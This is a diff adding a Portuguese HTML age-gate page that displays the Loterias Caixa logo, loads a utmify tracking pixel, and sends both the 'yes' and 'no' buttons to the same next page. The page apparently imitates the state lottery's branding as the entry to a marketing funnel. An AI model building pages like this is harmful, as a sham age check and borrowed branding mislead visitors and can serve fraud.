@@ -1,0 +1,127 @@
+﻿<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title></title>
+
+  <link href="css/bootstrap.min.css" rel="stylesheet" crossorigin="anonymous">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="css2.css?family=Inter:ital,opsz,wght@0,14..32,100..900;1,14..32,100..900&display=swap" rel="stylesheet">
+
+  <script src="js/latest.js" data-utmify-prevent-subids async defer></script>
+  <script>
+    window.pixelId = "675c826bfe3c5b3055ee8bfd";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+  <script async defer src="js/pixel.js"></script>
+
+  <style>
+    @font-face {
+      font-family: 'Futura-Book';
+      src: url('fonts/Futura-Book.eot');
+      src: url('fonts/Futura-Book.eot') format('embedded-opentype'),
+           url('fonts/Futura-Book.woff2') format('woff2'),
+           url('fonts/Futura-Book.woff') format('woff'),
+           url('fonts/Futura-Book.ttf') format('truetype'),
+           url('images/Futura-Book.svg') format('svg');
+      font-display: swap;
+    }
+
+    html, body {
+      margin: 0;
+      width: 100%;
+      height: 120dvh;
+      background: linear-gradient(45deg, #00a9ad, #005ca9);
+      background-repeat: no-repeat;
+      background-size: cover;
+    }
+
+    body {
+      font-family: 'Futura-Book' !important;
+      overflow: hidden;
+    }
+
+    .container-principal {
+      height: 120dvh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .bloco-central {
+      transform: translateY(-6vh);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 1.6rem;
+      width: 100%;
+    }
+
+    .container-principal img {
+      width: 140px;
+      margin: 0 auto;
+      display: block;
+    }
+
+    .container-principal h1 {
+      color: white;
+      font-size: 1.6rem;
+      margin: 0;
+      text-align: center;
+    }
+
+    /* ✅ ESPAÇO ENTRE OS BOTÕES */
+    .botoes {
+      display: flex;
+      flex-direction: column;
+      gap: 0.8rem;
+    }
+
+    .botoes a {
+      width: 10rem;
+    }
+
+    .botoes button {
+      background-color: #f39200;
+      color: white;
+      font-weight: 600;
+      width: 100%;
+      border: none;
+      padding: .9rem .5rem;
+      font-size: 1.35rem;
+      border-radius: .5rem;
+    }
+
+    .botoes button:hover {
+      background-color: #173e68;
+    }
+
+    .btn-nao {
+      background-color: #173e68;
+      color: white;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container-principal">
+    <div class="bloco-central">
+      <img src="../images/loterias-caixa-logo.webp" alt="">
+      <h1>Você tem mais de 18 anos?</h1>
+      <div class="botoes">
+        <a href="../1/index.htm"><button>SIM</button></a>
+        <a href="../1/index.htm"><button class="btn-nao">NÃO</button></a>
+      </div>
+    </div>
+  </div>
+
+  <script src="js/bootstrap.bundle.min.js" crossorigin="anonymous"></script>
+</body>
+</html>
